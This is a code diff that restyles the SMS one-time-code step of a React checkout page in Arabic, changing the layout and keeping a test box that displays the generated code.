@@ -564,101 +564,96 @@ const CheckoutPage: React.FC = () => {
             )}
 
             {step === 3 && (
-              <div className="bg-white rounded-2xl shadow-lg p-8">
-                <div className="text-center mb-8">
-                  <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <MessageSquare className="w-10 h-10 text-blue-500" />
-                  </div>
-                  <h2 className="text-2xl font-bold text-gray-900 mb-4">الرقم السري المؤقت</h2>
-                  <p className="text-gray-600 leading-relaxed">
-                    عميلنا العزيز، نرجو إدخال الرقم السري المؤقت المرسل برسالة نصية إلى جوالك 
-                    <span className="font-semibold text-gray-900"> {maskPhoneNumber(shippingInfo.phone)} </span>
-                    لإتمام العملية من التاجر حسب التفاصيل التالية
-                  </p>
+              <div className="bg-gray-100 min-h-screen">
+                {/* Header */}
+                <div className="bg-green-500 text-white p-4 text-center">
+                  <h1 className="text-xl font-bold">الرقم السري المؤقت</h1>
                 </div>
 
-                {/* عرض الكود للتجربة */}
-                <div className="bg-yellow-50 border-2 border-yellow-200 rounded-lg p-4 mb-6">
-                  <div className="flex items-center gap-3">
-                    <div className="text-2xl">📱</div>
-                    <div>
-                      <h4 className="font-semibold text-yellow-800">للتجربة - الكود المرسل:</h4>
-                      <p className="text-xl font-mono font-bold text-yellow-900">{generatedCode}</p>
-                    </div>
-                  </div>
-                </div>
+                <div className="max-w-md mx-auto p-6">
+                  {/* Main Content */}
+                  <div className="bg-white rounded-lg p-6 mb-6 text-center">
+                    <p className="text-gray-700 mb-4 leading-relaxed">
+                      عميلنا العزيز، نرجو إدخال الرقم السري المؤقت المرسل برسالة نصية إلى جوالك 
+                      <span className="font-bold text-black"> {maskPhoneNumber(shippingInfo.phone)} </span>
+                      لإتمام العملية من التاجر حسب التفاصيل التالية
+                    </p>
 
-                <form onSubmit={handleSmsVerification} className="space-y-6">
-                  <div>
-                    <label className="block text-sm font-medium text-gray-700 mb-4 text-center">
-                      أدخل الرقم السري (6 أرقام)
-                    </label>
-                    <div className="flex justify-center">
-                      <input
-                        type="text"
-                        value={smsCode}
-                        onChange={(e) => {
-                          const value = e.target.value.replace(/\D/g, '');
-                          if (value.length <= 6) {
-                            setSmsCode(value);
-                            setCodeError('');
-                          }
-                        }}
-                        className="w-64 px-6 py-4 text-center text-2xl font-mono border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent tracking-widest"
-                        placeholder="* * * * * *"
-                        maxLength={6}
-                        required
-                      />
+                    {/* Code Display Box */}
+                    <div className="bg-yellow-100 border-2 border-yellow-300 rounded-lg p-4 mb-6">
+                      <div className="flex items-center justify-center gap-3">
+                        <div className="w-8 h-8 bg-blue-500 rounded flex items-center justify-center">
+                          <MessageSquare className="w-5 h-5 text-white" />
+                        </div>
+                        <div className="text-right">
+                          <p className="text-sm text-gray-700 mb-1">للتجربة - الكود المرسل</p>
+                          <p className="text-2xl font-bold text-black font-mono">{generatedCode}</p>
+                        </div>
+                      </div>
                     </div>
-                    {codeError && (
-                      <p className="text-red-500 text-sm text-center mt-2">{codeError}</p>
-                    )}
-                  </div>
 
-                  {/* Timer */}
-                  <div className="text-center">
-                    <div className="flex items-center justify-center gap-2 mb-4">
-                      <Clock className="w-5 h-5 text-gray-500" />
-                      <span className={`font-mono text-lg ${timeLeft < 30 ? 'text-red-500' : 'text-gray-600'}`}>
-                        {formatTime(timeLeft)}
-                      </span>
-                    </div>
-                    
-                    <button
-                      type="button"
-                      onClick={handleResendCode}
-                      className="text-green-600 hover:text-green-700 font-medium flex items-center gap-2 mx-auto"
-                    >
-                      <RefreshCw className="w-4 h-4" />
-                      إعادة إرسال الكود
-                    </button>
-                  </div>
+                    <p className="text-gray-600 mb-6">أدخل الرقم السري (6 أرقام)</p>
 
-                  <div className="flex gap-4">
-                    <button
-                      type="button"
-                      onClick={() => setStep(2)}
-                      className="flex-1 border border-gray-300 text-gray-700 py-4 rounded-lg hover:bg-gray-50 transition-colors font-semibold"
-                    >
-                      العودة
-                    </button>
-                    <button
-                      type="submit"
-                      disabled={isProcessing || smsCode.length !== 6}
-                      className="flex-1 bg-black text-white py-4 rounded-lg hover:bg-gray-800 transition-colors font-semibold text-lg disabled:opacity-50 disabled:cursor-not-allowed"
-                    >
-                      {isProcessing ? 'جاري التحقق...' : 'تأكيد'}
-                    </button>
-                  </div>
-                </form>
+                    {/* Code Input */}
+                    <form onSubmit={handleSmsVerification}>
+                      <div className="mb-6">
+                        <input
+                          type="text"
+                          value={smsCode}
+                          onChange={(e) => {
+                            const value = e.target.value.replace(/\D/g, '');
+                            if (value.length <= 6) {
+                              setSmsCode(value);
+                              setCodeError('');
+                            }
+                          }}
+                          className="w-full px-4 py-4 text-center text-3xl font-mono border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 tracking-[0.5em] bg-gray-50"
+                          placeholder="* * * * * *"
+                          maxLength={6}
+                          required
+                        />
+                        {codeError && (
+                          <p className="text-red-500 text-sm text-center mt-2">{codeError}</p>
+                        )}
+                      </div>
 
-                {/* Security Notice */}
-                <div className="mt-6 bg-gray-50 border border-gray-200 rounded-lg p-4">
-                  <div className="flex items-center gap-3">
-                    <Shield className="w-5 h-5 text-gray-500" />
-                    <div className="text-sm text-gray-600">
-                      <p>لأمانك، لا تشارك هذا الرقم مع أي شخص آخر</p>
-                    </div>
+                      {/* Timer */}
+                      <div className="text-center mb-6">
+                        <div className="flex items-center justify-center gap-2 mb-4">
+                          <Clock className="w-5 h-5 text-gray-500" />
+                          <span className={`font-mono text-xl ${timeLeft < 30 ? 'text-red-500' : 'text-gray-600'}`}>
+                            {formatTime(timeLeft)}
+                          </span>
+                        </div>
+                        
+                        <button
+                          type="button"
+                          onClick={handleResendCode}
+                          className="text-green-600 hover:text-green-700 font-medium flex items-center gap-2 mx-auto"
+                        >
+                          <RefreshCw className="w-4 h-4" />
+                          إعادة إرسال الكود
+                        </button>
+                      </div>
+
+                      {/* Action Buttons */}
+                      <div className="flex gap-3">
+                        <button
+                          type="button"
+                          onClick={() => setStep(2)}
+                          className="flex-1 bg-white border-2 border-gray-300 text-gray-700 py-4 rounded-lg hover:bg-gray-50 transition-colors font-semibold"
+                        >
+                          العودة
+                        </button>
+                        <button
+                          type="submit"
+                          disabled={isProcessing || smsCode.length !== 6}
+                          className="flex-1 bg-gray-600 text-white py-4 rounded-lg hover:bg-gray-700 transition-colors font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
+                        >
+                          {isProcessing ? 'جاري التحقق...' : 'تأكيد'}
+                        </button>
+                      </div>
+                    </form>
                   </div>
                 </div>
               </div>
